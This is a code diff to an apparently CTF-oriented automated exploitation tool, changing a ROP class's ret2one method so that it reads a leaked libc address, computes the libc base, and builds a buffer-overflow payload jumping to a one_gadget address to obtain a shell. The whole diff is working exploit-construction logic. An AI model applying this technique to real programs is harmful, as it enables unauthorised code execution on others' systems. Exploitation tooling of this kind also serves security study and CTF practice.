@@ -7,7 +7,7 @@ import os
 from Print import Print
 
 class ROP:
-    def __init__(self, analysis, v_lvl): 
+    def __init__(self, analysis, v_lvl, p): 
         self.fart_print = Print(v_lvl)
         self.analysis = analysis
         self.filename = analysis.binary
@@ -17,6 +17,7 @@ class ROP:
         self.gadgets = []
         self.find_gadgets()
         self.libc = "/opt/libc.so.6"
+        self.p = p
 
         self.fart_print.info("Buffer overflow likely!")
 
@@ -130,11 +131,23 @@ class ROP:
     def ret2one(self, failed):
         self.fart_print.info("Crafting payload for ret2one")
         payload = self.offset
-        p = process(self.filename)
-        given = int("0x"+io.recvuntil(b'>>>').decode('utf-8').split('0x')[1].split(' ')[0].strip('\n'),16)
-        leak = p.recvline().decode('utf-8').strip()
-        p.close() 
+        
+        p = self.p
+        p.recvuntil(b": ")  
 
+        leak = int(p.recvline().decode('utf-8').strip(), 16)
+ 
+        func_addr = self.analysis.libc.sym[self.analysis.find_leaked_function()]
+        base = leak - func_addr
+        
+        gadget_offset = self.one_gadget()[1]
+        gadget_addr = base + gadget_offset
+        if failed:
+            payload += self.realign()
+        payload += p64(gadget_addr)
+        payload += p64(0)*0x50
+        self.analysis.hbsh = True
+        
         return payload
 
     def generic_first_arg(self):
